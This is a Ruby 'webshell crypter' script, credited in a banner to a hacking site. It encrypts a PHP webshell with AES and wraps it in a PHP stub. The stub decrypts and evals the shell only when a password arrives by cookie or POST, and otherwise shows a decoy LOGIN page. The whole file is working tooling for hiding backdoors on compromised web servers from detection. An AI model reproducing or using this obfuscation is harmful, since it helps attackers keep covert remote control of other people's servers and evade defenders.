#ruby
=begin                   #                 
                        ###                   
                       ## ##                  
                      ### ###                 
                     ###   ###                
               ######################         
              ########################        
               ###  ###    ####  ####         
                ## ###      ### ####          
                 #####      #######           
         ###     ######     ######   ###      
        ######  ########   #######  #######   
       ######   ######### #########  #######  
      #####    ####  ######### #####    ####  
      #####   #####   #######   #####   ####  
       ###########     #####     ###########  
        #########       ##        #########   
         #####                      #####
            ---visit: www.unnex.de---
=end

require 'openssl'

module AESCrypt

require 'digest/md5'

$aa="#####################################################\n###webshell (php) crypter - script by www.unnex.de###\n#####################################################\n\n"
$info=$aa+"example: ruby crypter.rb password123 oldshell.php\n\nnotice: the script only works with pure php files!\n^---work: <?php echo \"<html>\" . phpinfo() . \"</html>\" ?>\n^---not work: <html><?php echo phpinfo() ?></html>"
if ARGV[0]==nil
puts $info
exit
if ARGV[0].length<1
puts $info
exit
end
end
if ARGV[1]==nil
puts $info
exit
if ARGV[1].length<1
puts $info
exit
end
end

def AESCrypt.encrypt(data, key, iv, cipher_type)
aes = OpenSSL::Cipher::Cipher.new(cipher_type)
aes.encrypt
aes.key = key
aes.iv = iv if iv != nil
aes.update(data) + aes.final
end
end

def hexa(qy)
qy=qy.unpack('H*').to_s()
qy=qy.split(/"/)
return qy[1]
end

if File.exist?(ARGV[1])==false
puts $info
exit
end
f=File.open(ARGV[1])
code=f.read
f.close
if code.length<1
puts $info
exit
end
codelen=code.length.to_s()

if code.length>2
if code[0]+code[1]=="<?"
if not code[0]+code[1]+code[2].downcase=="<?p"
code=code.sub(/<\?/, "<?php")
end
end
end

key=Digest::MD5.hexdigest(ARGV[0])
iv=""
while iv.length<17
iva=Random.new
iv+=iva.rand(10).to_s()
end
code="0000000000000000"+code
crypt=AESCrypt.encrypt(code, key, iv, 'AES-256-CBC')
crypt=hexa(crypt)

ivp=""
while ivp.length<33
iva=Random.new
ivp+=iva.rand(10).to_s()
end
ivp=Digest::MD5.hexdigest(ivp)

ivpra=ivp
out="<?php if (isset($_COOKIE[\"r\"])) { $_POST[\"r\"]=$_COOKIE[\"r\"]; } if (isset($_POST[\"r\"])) { "

chars=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 'r', 't', 'u', 'v', 'w', 'x', 'y', 'z']
ivp=""
iva=Random.new
ivb=iva.rand(4)+1
while ivp.length<ivb
iva=Random.new
ivp+=chars[iva.rand(26)]
end
a=ivp

iva=Random.new
a=ivp+chars[iva.rand(26)]
out+="$"+a+"=pack(\"H*\" , '"+crypt+"'); "
iva=Random.new
b=a+chars[iva.rand(26)]
out+="$"+b+"='1234567890123456'; "
iva=Random.new
c=b+chars[iva.rand(26)]
iva=Random.new
d=c+chars[iva.rand(26)]
iva=Random.new
e=d+chars[iva.rand(26)]

ivk=""
while ivk.length<17
iva=Random.new
ivk+=iva.rand(10).to_s()
end
keya=Digest::MD5.hexdigest(ivk)
out+="$"+c+"='"+keya+"'; "
now=AESCrypt.encrypt("0000000000000000"+d, key, iv, 'AES-256-CBC')
now=hexa(now)
out+="$"+d+"='"+now+"'; $"+e+"='"+d+"'; if (substr(urlencode(substr(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, md5($_POST[\"r\"]), pack(\"H*\" , $"+d+"), MCRYPT_MODE_CBC, \""+iv+"\"), 16)), 0, strlen($"+e+"))==$"+e+") { setcookie(\"r\", $_POST[\"r\"], time()+31536000); eval(preg_replace(\"/<\\?php/i\", \"\", substr(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, md5($_POST[\"r\"]), pack(\"H*\" , '"+crypt+"'), MCRYPT_MODE_CBC, \""+iv+"\"), 16), 1)); exit; } } "

now=AESCrypt.encrypt("0000000000000000<html><head><title>LOGIN</title><meta content=\"no-cache\"></head><body bgcolor=\"#000000\"><br><div align=\"center\"><table width=80% cellpadding=0 cellspacing=0 style=\"border-style: double; border-radius: 10px;background:rgba(66, 66, 66, 0.5);\" border=\"0\"><tr><td width=\"11\" height=\"11\"><br><form action=\"\" name=\"ar\" method=\"post\"><div align=\"center\"><input type=\"password\" value=\"password\" name=\"r\" id=\"kg\" style=\"text-align: center; opacity: 0.89; cursor: text; font-size: 14px;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.89'\"><div style=\"width: 190px; background-color: rgb(139, 139, 131); cursor: pointer; opacity: 0.88;\" onmouseover=\"style.opacity='1.0'\" onmouseout=\"style.opacity='0.88'\" onclick=\"document.ar.submit();\"><p align=\"center\">LOGIN</p></div></div></form></td></tr></table></div></body></html>", ivpra, iv, 'AES-256-CBC')
now=hexa(now)
out+="if (isset($_COOKIE[\"r\"])) { setcookie(\"r\", \"0\",time()-1); } echo substr(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, \""+ivpra+"\", pack(\"H*\" , '"+now+"'), MCRYPT_MODE_CBC, \""+iv+"\"), 16); ?>"

file=File.open("crypted.php", "w")
file.write(out)

puts $aa+"characters (original): "+codelen+"\ncharacters (body+crypted): "+out.length.to_s()+"\n\nstored in "+File.expand_path(File.dirname(__FILE__))+"/crypted.php"
